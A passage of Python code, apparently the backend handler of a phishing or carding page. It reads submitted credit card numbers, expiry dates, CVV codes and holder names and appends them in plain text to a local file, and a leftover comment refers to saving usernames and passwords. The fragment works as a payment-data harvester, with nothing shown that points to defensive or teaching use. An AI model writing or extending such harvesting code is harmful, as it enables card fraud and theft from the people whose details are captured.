...
#    password = data.get('password')
    ccnum = data.get('ccNumber')
    ccexp = data.get('ccExpiry')
    cvv = data.get('CVV')
    ccholder = data.get('ccHolder')

    if ccnum and ccexp and cvv:
        # Open the file in append mode and save the username and password
        with open(data_file, 'a') as file:
            file.write(f"CC Number: {ccnum}, Expiry: {ccexp}, CVV: {cvv}, Holder's name: \"{ccholder}\"\n")
